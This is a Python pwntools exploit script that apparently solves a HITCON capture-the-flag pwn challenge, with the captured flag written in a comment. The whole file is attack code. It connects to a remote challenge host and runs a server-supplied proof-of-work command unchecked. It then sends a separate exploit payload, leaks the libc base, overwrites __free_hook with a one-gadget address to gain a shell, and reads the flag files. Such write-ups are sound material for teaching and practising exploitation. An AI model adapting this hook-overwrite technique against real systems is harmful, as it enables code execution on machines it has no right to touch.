#!/usr/bin/env python
from pwn import *
import subprocess

# hitcon{H0p3_y0u_Enj0y_pWn1ng_th1S_3m0j1_vM_^_^b}

l = ELF( './libc.so.6' ) # BuildID[sha1]=b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0
y = remote( '3.115.176.164' , 30262 )

y.recvuntil('token:\n')
cmd = y.recvline().strip()
res = subprocess.check_output(cmd.split()).strip()

y.sendlineafter( ':' , res )

p = open( './exp' ).read()
y.sendlineafter( ')' , str( len(p) ) )

y.send( p )
y.recvline()

l.address = int( y.recv(15) ) - 0x98f9c0
success( 'libc -> %s' % hex( l.address ) )

y.send( p64( l.sym.__free_hook ) )

sleep(0.3)

one = 0x4f322
y.send( p64( l.address + one ) )

y.sendline( 'cat /home/*/flag' )

y.interactive()